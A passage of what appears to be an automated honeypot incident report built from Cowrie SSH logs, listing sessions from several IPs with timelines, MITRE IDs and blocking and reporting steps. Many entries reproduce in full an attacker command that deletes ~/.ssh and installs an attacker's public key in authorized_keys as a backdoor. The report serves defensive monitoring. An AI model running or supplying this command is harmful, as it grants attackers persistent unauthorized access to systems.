| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 06:13:40` | `cowrie.session.connect` |
| `2026-06-10 06:13:40` | `cowrie.client.version` |
| `2026-06-10 06:13:40` | `cowrie.client.kex` |
| `2026-06-10 06:13:40` | `cowrie.login.success` |
| `2026-06-10 06:13:41` | `cowrie.session.params` |
| `2026-06-10 06:13:41` | `cowrie.command.input` |
| `2026-06-10 06:13:41` | `cowrie.command.failed` |
| `2026-06-10 06:13:41` | `cowrie.log.closed` |
| `2026-06-10 06:13:41` | `cowrie.session.params` |
| `2026-06-10 06:13:41` | `cowrie.command.input` |
| `2026-06-10 06:13:41` | `cowrie.session.file_download` |
| `2026-06-10 06:13:41` | `cowrie.log.closed` |
| `2026-06-10 06:13:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.155[.]9` to AbuseIPDB if not already reported
- [ ] Block `101.47.155[.]9` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24b6aed74109

| Field | Detail |
|---|---|
| **Source IP** | `101.47.155[.]9` |
| **First Seen** | 2026-06-10 06:13 |
| **Last Seen** | 2026-06-10 06:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 06:13:42` | `cowrie.session.connect` |
| `2026-06-10 06:13:42` | `cowrie.client.version` |
| `2026-06-10 06:13:42` | `cowrie.client.kex` |
| `2026-06-10 06:13:43` | `cowrie.login.success` |
| `2026-06-10 06:13:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.155[.]9` to AbuseIPDB if not already reported
- [ ] Block `101.47.155[.]9` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f5802715093

| Field | Detail |
|---|---|
| **Source IP** | `188.215.31[.]4` |
| **First Seen** | 2026-06-10 06:19 |
| **Last Seen** | 2026-06-10 06:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 06:19:15` | `cowrie.session.connect` |
| `2026-06-10 06:19:15` | `cowrie.client.version` |
| `2026-06-10 06:19:15` | `cowrie.client.kex` |
| `2026-06-10 06:19:16` | `cowrie.login.success` |
| `2026-06-10 06:19:16` | `cowrie.session.params` |
| `2026-06-10 06:19:16` | `cowrie.command.input` |
| `2026-06-10 06:19:16` | `cowrie.command.failed` |
| `2026-06-10 06:19:16` | `cowrie.log.closed` |
| `2026-06-10 06:19:17` | `cowrie.session.params` |
| `2026-06-10 06:19:17` | `cowrie.command.input` |
| `2026-06-10 06:19:17` | `cowrie.session.file_download` |
| `2026-06-10 06:19:17` | `cowrie.log.closed` |
| `2026-06-10 06:19:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.215.31[.]4` to AbuseIPDB if not already reported
- [ ] Block `188.215.31[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02aba0b5cb09

| Field | Detail |
|---|---|
| **Source IP** | `188.215.31[.]4` |
| **First Seen** | 2026-06-10 06:19 |
| **Last Seen** | 2026-06-10 06:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 06:19:19` | `cowrie.session.connect` |
| `2026-06-10 06:19:19` | `cowrie.client.version` |
| `2026-06-10 06:19:19` | `cowrie.client.kex` |
| `2026-06-10 06:19:20` | `cowrie.login.success` |
| `2026-06-10 06:19:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.215.31[.]4` to AbuseIPDB if not already reported
- [ ] Block `188.215.31[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78aeb134424b

| Field | Detail |
|---|---|
| **Source IP** | `101.47.155[.]9` |
| **First Seen** | 2026-06-10 06:21 |
| **Last Seen** | 2026-06-10 06:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 06:21:19` | `cowrie.session.connect` |
| `2026-06-10 06:21:19` | `cowrie.client.version` |
| `2026-06-10 06:21:19` | `cowrie.client.kex` |
| `2026-06-10 06:21:19` | `cowrie.login.success` |
| `2026-06-10 06:21:19` | `cowrie.session.params` |
| `2026-06-10 06:21:19` | `cowrie.command.input` |
| `2026-06-10 06:21:19` | `cowrie.command.failed` |
| `2026-06-10 06:21:20` | `cowrie.log.closed` |
| `2026-06-10 06:21:20` | `cowrie.session.params` |
| `2026-06-10 06:21:20` | `cowrie.command.input` |
| `2026-06-10 06:21:20` | `cowrie.session.file_download` |
| `2026-06-10 06:21:20` | `cowrie.log.closed` |
| `2026-06-10 06:21:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.155[.]9` to AbuseIPDB if not already reported
- [ ] Block `101.47.155[.]9` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af7696a58db1

| Field | Detail |
|---|---|
| **Source IP** | `101.47.155[.]9` |
| **First Seen** | 2026-06-10 06:21 |
| **Last Seen** | 2026-06-10 06:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 06:21:21` | `cowrie.session.connect` |
| `2026-06-10 06:21:21` | `cowrie.client.version` |
| `2026-06-10 06:21:21` | `cowrie.client.kex` |
| `2026-06-10 06:21:22` | `cowrie.login.success` |
| `2026-06-10 06:21:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.155[.]9` to AbuseIPDB if not already reported
- [ ] Block `101.47.155[.]9` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aebb62ae24f5

| Field | Detail |
|---|---|
| **Source IP** | `188.215.31[.]4` |
| **First Seen** | 2026-06-10 06:22 |
| **Last Seen** | 2026-06-10 06:22 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 06:22:00` | `cowrie.session.connect` |
| `2026-06-10 06:22:00` | `cowrie.client.version` |
| `2026-06-10 06:22:00` | `cowrie.client.kex` |
| `2026-06-10 06:22:01` | `cowrie.login.success` |
| `2026-06-10 06:22:01` | `cowrie.session.params` |
| `2026-06-10 06:22:01` | `cowrie.command.input` |
| `2026-06-10 06:22:01` | `cowrie.command.failed` |
| `2026-06-10 06:22:01` | `cowrie.log.closed` |
| `2026-06-10 06:22:02` | `cowrie.session.params` |
| `2026-06-10 06:22:02` | `cowrie.command.input` |
| `2026-06-10 06:22:02` | `cowrie.session.file_download` |
| `2026-06-10 06:22:02` | `cowrie.log.closed` |
| `2026-06-10 06:22:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.215.31[.]4` to AbuseIPDB if not already reported
- [ ] Block `188.215.31[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70afa99d4eec

| Field | Detail |
|---|---|
| **Source IP** | `188.215.31[.]4` |
| **First Seen** | 2026-06-10 06:22 |
| **Last Seen** | 2026-06-10 06:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 06:22:04` | `cowrie.session.connect` |
| `2026-06-10 06:22:04` | `cowrie.client.version` |
| `2026-06-10 06:22:04` | `cowrie.client.kex` |
| `2026-06-10 06:22:05` | `cowrie.login.success` |
| `2026-06-10 06:22:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.215.31[.]4` to AbuseIPDB if not already reported
- [ ] Block `188.215.31[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c591233c22b

| Field | Detail |
|---|---|
| **Source IP** | `188.215.31[.]4` |
| **First Seen** | 2026-06-10 06:23 |
| **Last Seen** | 2026-06-10 06:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 06:23:48` | `cowrie.session.connect` |
| `2026-06-10 06:23:48` | `cowrie.client.version` |
| `2026-06-10 06:23:48` | `cowrie.client.kex` |
| `2026-06-10 06:23:48` | `cowrie.login.success` |
| `2026-06-10 06:23:49` | `cowrie.session.params` |
| `2026-06-10 06:23:49` | `cowrie.command.input` |
| `2026-06-10 06:23:49` | `cowrie.command.failed` |
| `2026-06-10 06:23:49` | `cowrie.log.closed` |
| `2026-06-10 06:23:49` | `cowrie.session.params` |
| `2026-06-10 06:23:49` | `cowrie.command.input` |
| `2026-06-10 06:23:49` | `cowrie.session.file_download` |
| `2026-06-10 06:23:49` | `cowrie.log.closed` |
| `2026-06-10 06:23:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.215.31[.]4` to AbuseIPDB if not already reported
- [ ] Block `188.215.31[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f79e55181df

| Field | Detail |
|---|---|
| **Source IP** | `188.215.31[.]4` |
| **First Seen** | 2026-06-10 06:23 |
| **Last Seen** | 2026-06-10 06:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 06:23:51` | `cowrie.session.connect` |
| `2026-06-10 06:23:51` | `cowrie.client.version` |
| `2026-06-10 06:23:52` | `cowrie.client.kex` |
| `2026-06-10 06:23:52` | `cowrie.login.success` |
| `2026-06-10 06:23:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.215.31[.]4` to AbuseIPDB if not already reported
- [ ] Block `188.215.31[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39a0f1056eb7

| Field | Detail |
|---|---|
| **Source IP** | `101.47.155[.]9` |
| **First Seen** | 2026-06-10 06:28 |
| **Last Seen** | 2026-06-10 06:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 06:28:56` | `cowrie.session.connect` |
| `2026-06-10 06:28:56` | `cowrie.client.version` |
| `2026-06-10 06:28:56` | `cowrie.client.kex` |
| `2026-06-10 06:28:56` | `cowrie.login.success` |
| `2026-06-10 06:28:56` | `cowrie.session.params` |
| `2026-06-10 06:28:56` | `cowrie.command.input` |
| `2026-06-10 06:28:56` | `cowrie.command.failed` |
| `2026-06-10 06:28:56` | `cowrie.log.closed` |
| `2026-06-10 06:28:57` | `cowrie.session.params` |
| `2026-06-10 06:28:57` | `cowrie.command.input` |
| `2026-06-10 06:28:57` | `cowrie.session.file_download` |
| `2026-06-10 06:28:57` | `cowrie.log.closed` |
| `2026-06-10 06:28:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.155[.]9` to AbuseIPDB if not already reported
- [ ] Block `101.47.155[.]9` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2abef6d37002

| Field | Detail |
|---|---|
| **Source IP** | `101.47.155[.]9` |
| **First Seen** | 2026-06-10 06:28 |
| **Last Seen** | 2026-06-10 06:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 06:28:58` | `cowrie.session.connect` |
| `2026-06-10 06:28:58` | `cowrie.client.version` |
| `2026-06-10 06:28:58` | `cowrie.client.kex` |
| `2026-06-10 06:28:59` | `cowrie.login.success` |
| `2026-06-10 06:28:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.155[.]9` to AbuseIPDB if not already reported
- [ ] Block `101.47.155[.]9` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1068879cd330

| Field | Detail |
|---|---|
| **Source IP** | `158.173.154[.]114` |
| **First Seen** | 2026-06-10 06:40 |
| **Last Seen** | 2026-06-10 06:40 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat /etc/issue` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 06:40:05` | `cowrie.session.connect` |
| `2026-06-10 06:40:05` | `cowrie.client.version` |
| `2026-06-10 06:40:06` | `cowrie.client.kex` |
| `2026-06-10 06:40:06` | `cowrie.login.success` |
| `2026-06-10 06:40:06` | `cowrie.client.size` |
| `2026-06-10 06:40:07` | `cowrie.session.params` |
| `2026-06-10 06:40:08` | `cowrie.command.input` |
| `2026-06-10 06:40:10` | `cowrie.log.closed` |
| `2026-06-10 06:40:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.173.154[.]114` to AbuseIPDB if not already reported
- [ ] Block `158.173.154[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b50fbd716430

| Field | Detail |
|---|---|
| **Source IP** | `103.154.158[.]70` |
| **First Seen** | 2026-06-10 08:02 |
| **Last Seen** | 2026-06-10 08:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 08:02:51` | `cowrie.session.connect` |
| `2026-06-10 08:02:51` | `cowrie.client.version` |
| `2026-06-10 08:02:51` | `cowrie.client.kex` |
| `2026-06-10 08:02:52` | `cowrie.login.success` |
| `2026-06-10 08:02:52` | `cowrie.session.params` |
| `2026-06-10 08:02:52` | `cowrie.command.input` |
| `2026-06-10 08:02:52` | `cowrie.command.failed` |
| `2026-06-10 08:02:52` | `cowrie.log.closed` |
| `2026-06-10 08:02:52` | `cowrie.session.params` |
| `2026-06-10 08:02:52` | `cowrie.command.input` |
| `2026-06-10 08:02:52` | `cowrie.session.file_download` |
| `2026-06-10 08:02:52` | `cowrie.log.closed` |
| `2026-06-10 08:02:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.154.158[.]70` to AbuseIPDB if not already reported
- [ ] Block `103.154.158[.]70` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6ab5f2d4c54

| Field | Detail |
|---|---|
| **Source IP** | `103.154.158[.]70` |
| **First Seen** | 2026-06-10 08:02 |
| **Last Seen** | 2026-06-10 08:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 08:02:54` | `cowrie.session.connect` |
| `2026-06-10 08:02:54` | `cowrie.client.version` |
| `2026-06-10 08:02:54` | `cowrie.client.kex` |
| `2026-06-10 08:02:54` | `cowrie.login.success` |
| `2026-06-10 08:02:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.154.158[.]70` to AbuseIPDB if not already reported
- [ ] Block `103.154.158[.]70` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-905ffe89c886

| Field | Detail |
|---|---|
| **Source IP** | `103.154.158[.]70` |
| **First Seen** | 2026-06-10 08:07 |
| **Last Seen** | 2026-06-10 08:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 08:07:28` | `cowrie.session.connect` |
| `2026-06-10 08:07:28` | `cowrie.client.version` |
| `2026-06-10 08:07:28` | `cowrie.client.kex` |
| `2026-06-10 08:07:28` | `cowrie.login.success` |
| `2026-06-10 08:07:28` | `cowrie.session.params` |
| `2026-06-10 08:07:28` | `cowrie.command.input` |
| `2026-06-10 08:07:28` | `cowrie.command.failed` |
| `2026-06-10 08:07:29` | `cowrie.log.closed` |
| `2026-06-10 08:07:29` | `cowrie.session.params` |
| `2026-06-10 08:07:29` | `cowrie.command.input` |
| `2026-06-10 08:07:29` | `cowrie.session.file_download` |
| `2026-06-10 08:07:29` | `cowrie.log.closed` |
| `2026-06-10 08:07:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.154.158[.]70` to AbuseIPDB if not already reported
- [ ] Block `103.154.158[.]70` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36a34b087027

| Field | Detail |
|---|---|
| **Source IP** | `103.154.158[.]70` |
| **First Seen** | 2026-06-10 08:07 |
| **Last Seen** | 2026-06-10 08:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 08:07:30` | `cowrie.session.connect` |
| `2026-06-10 08:07:30` | `cowrie.client.version` |
| `2026-06-10 08:07:30` | `cowrie.client.kex` |
| `2026-06-10 08:07:31` | `cowrie.login.success` |
| `2026-06-10 08:07:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.154.158[.]70` to AbuseIPDB if not already reported
- [ ] Block `103.154.158[.]70` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b972e6eed56d

| Field | Detail |
|---|---|
| **Source IP** | `13.71.92[.]229` |
| **First Seen** | 2026-06-10 08:12 |
| **Last Seen** | 2026-06-10 08:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
